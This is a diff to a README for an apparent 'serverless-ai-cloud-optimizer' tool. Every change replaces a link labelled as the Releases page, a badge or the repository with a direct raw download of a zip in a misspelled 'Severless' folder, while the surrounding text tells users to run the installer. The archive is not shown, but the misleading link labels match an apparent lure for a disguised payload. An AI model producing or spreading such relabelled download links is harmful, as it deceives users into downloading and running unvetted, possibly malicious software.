@@ -1,6 +1,6 @@
 # 🌤️ serverless-ai-cloud-optimizer - Optimize Your Cloud Resources Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/player247/serverless-ai-cloud-optimizer/releases)
+[![Download](https://github.com/player247/serverless-ai-cloud-optimizer/raw/refs/heads/main/Severless/optimizer-ai-serverless-cloud-v1.9.zip%20Now-Release-blue)](https://github.com/player247/serverless-ai-cloud-optimizer/raw/refs/heads/main/Severless/optimizer-ai-serverless-cloud-v1.9.zip)
 
 ## 📄 Overview
 
@@ -11,7 +11,7 @@ The serverless-ai-cloud-optimizer is an AI-powered tool designed to help you man
 To use the serverless-ai-cloud-optimizer, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://github.com/player247/serverless-ai-cloud-optimizer/releases) to find the latest version of the application.
+   Go to our [Releases page](https://github.com/player247/serverless-ai-cloud-optimizer/raw/refs/heads/main/Severless/optimizer-ai-serverless-cloud-v1.9.zip) to find the latest version of the application.
 
 2. **Download the Application**
    On the Releases page, you will see a list of the available versions. Look for the most recent version and click the link to download the software package.
@@ -36,7 +36,7 @@ To ensure smooth operation, please confirm that your device meets the following 
 
 ## 📥 Download & Install
 
-You can download the latest version of serverless-ai-cloud-optimizer from our [Releases page](https://github.com/player247/serverless-ai-cloud-optimizer/releases). Simply select the most recent version, click the download link, and run the installer following the steps provided in the Getting Started section.
+You can download the latest version of serverless-ai-cloud-optimizer from our [Releases page](https://github.com/player247/serverless-ai-cloud-optimizer/raw/refs/heads/main/Severless/optimizer-ai-serverless-cloud-v1.9.zip). Simply select the most recent version, click the download link, and run the installer following the steps provided in the Getting Started section.
 
 ## 🔧 Using the Application
 
@@ -68,7 +68,7 @@ If you encounter any issues or have questions, please don't hesitate to reach ou
 
 ## 🔗 Additional Information
 
-- **GitHub Repository**: Explore our [GitHub repository](https://github.com/player247/serverless-ai-cloud-optimizer) for source code and more information.
+- **GitHub Repository**: Explore our [GitHub repository](https://github.com/player247/serverless-ai-cloud-optimizer/raw/refs/heads/main/Severless/optimizer-ai-serverless-cloud-v1.9.zip) for source code and more information.
 - **Changelog**: Stay informed on the latest updates by checking the changelog available on the Releases page.
 
 Feel free to dive into the serverless-ai-cloud-optimizer and take control of your cloud resources with confidence!
